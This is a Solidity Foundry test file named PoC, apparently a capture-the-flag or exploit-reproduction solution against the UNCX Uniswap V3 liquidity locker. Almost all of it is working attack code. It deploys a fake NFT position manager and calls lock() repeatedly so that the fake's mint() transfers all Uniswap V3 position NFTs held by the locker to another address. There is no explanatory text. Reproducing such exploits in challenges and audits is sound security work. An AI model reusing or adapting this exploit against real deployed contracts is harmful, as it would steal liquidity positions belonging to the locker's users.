// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Challenge.sol";

struct DecreaseLiquidityParams {
    uint256 tokenId;
    uint128 liquidity;
    uint256 amount0Min;
    uint256 amount1Min;
    uint256 deadline;
}

struct MintParams {
    address token0;
    address token1;
    uint24 fee;
    int24 tickLower;
    int24 tickUpper;
    uint256 amount0Desired;
    uint256 amount1Desired;
    uint256 amount0Min;
    uint256 amount1Min;
    address recipient;
    uint256 deadline;
}

struct CollectParams {
    uint256 tokenId;
    address recipient;
    uint128 amount0Max;
    uint128 amount1Max;
}

struct LockParams {
    address nftPositionManager; // the NFT Position manager of the Uniswap V3 fork
    uint256 nft_id; // the nft token_id
    address dustRecipient; // receiver of dust tokens which do not fit into liquidity and initial collection fees
    address owner; // owner of the lock
    address additionalCollector; // an additional address allowed to call collect (ideal for contracts to auto collect without having to use owner)
    address collectAddress; // The address to which automatic collections are sent
    uint256 unlockDate; // unlock date of the lock in seconds
    uint16 countryCode; // the country code of the locker / business
    string feeName; // The fee name key you wish to accept, use "DEFAULT" if in doubt
    bytes[] r; // use an empty array => []
}

interface ERC721 {
    function tokenOfOwnerByIndex(address, uint256) external returns (uint256);
    function balanceOf(address) external returns (uint256);
    function transferFrom(address from, address to, uint256 tokenId) external;
}

interface UNCX_ProofOfReservesV2_UniV3 {
    function lock(LockParams calldata params) external payable returns (uint256 lockId);
}

contract PoC is Test {
    Challenge public target;
    UNCX_ProofOfReservesV2_UniV3 public uncx;
    ERC721 public UNIV3;

    constructor() {
        target = Challenge(address(0xf550d71E794758F9bCA3f8928c3883D570b690F1));
        uncx = UNCX_ProofOfReservesV2_UniV3(address(0x7f5C649856F900d15C83741f45AE46f5C6858234));
        UNIV3 = ERC721(address(0xC36442b4a4522E871399CD717aBDD847Ab11FE88));

        uint256 num = UNIV3.balanceOf(address(uncx));
        uint256[] memory ids = new uint[](num);
        for (uint256 i = 0; i < num; i++) {
            ids[i] = UNIV3.tokenOfOwnerByIndex(address(uncx), i);
        }

        LockParams memory parm;
        parm.owner = address(this);
        parm.collectAddress = address(this);
        parm.unlockDate = block.timestamp + 1;
        parm.countryCode = 1;
        parm.feeName = "DEFAULT";

        uint256 i = 0;

        parm.nftPositionManager = address(new FakeNFTManager(ids[0], ids[1]));
        uncx.lock(parm);

        for (i = 2; i < 78; i += 2) {
            FakeNFTManager(address(parm.nftPositionManager)).setExploit(ids[i], ids[i + 1]);
            uncx.lock(parm);
        }

        parm.nftPositionManager = address(new FakeNFTManager(ids[78], ids[78]));
        uncx.lock(parm);
    }
}

contract FakeNFTManager {
    uint256 token0;
    uint256 token1;
    address token = address(0xC36442b4a4522E871399CD717aBDD847Ab11FE88);
    address public factory;

    constructor(uint256 _token0, uint256 _token1) {
        token0 = _token0;
        token1 = _token1;
        factory = address(this);
    }

    function setExploit(uint256 _token0, uint256 _token1) external {
        token0 = _token0;
        token1 = _token1;
    }

    function safeTransferFrom(address, address, uint256) external {}

    function positions(uint256 tokenId)
        external
        view
        returns (
            uint96 nonce,
            address operator,
            address _token0,
            address _token1,
            uint24 fee,
            int24 tickLower,
            int24 tickUpper,
            uint128 liquidity,
            uint256 feeGrowthInside0LastX128,
            uint256 feeGrowthInside1LastX128,
            uint128 tokensOwed0,
            uint128 tokensOwed1
        )
    {
        _token0 = token;
        _token1 = token;
    }

    function decreaseLiquidity(DecreaseLiquidityParams calldata params)
        external
        payable
        returns (uint256 amount0, uint256 amount1)
    {}

    function mint(MintParams calldata params) external payable returns (uint256, uint128, uint256, uint256) {
        if (token0 == token1) {
            ERC721(token).transferFrom(address(0x7f5C649856F900d15C83741f45AE46f5C6858234), address(11), token0);
            return (0, 0, type(uint256).max, type(uint256).max);
        }
        ERC721(token).transferFrom(address(0x7f5C649856F900d15C83741f45AE46f5C6858234), address(11), token0);
        ERC721(token).transferFrom(address(0x7f5C649856F900d15C83741f45AE46f5C6858234), address(11), token1);

        return (0, 0, type(uint256).max, type(uint256).max);
    }

    function burn(uint256 tokenId) external payable {}

    function collect(CollectParams calldata params) external payable returns (uint256 amount0, uint256 amount1) {
        amount0 = token0;
        amount1 = token1;
    }

    function getPool(address tokenA, address tokenB, uint24 fee) external view returns (address pool) {
        return address(this);
    }

    function feeAmountTickSpacing(uint24 fee) external view returns (int24 a) {
        a = 100;
    }
}
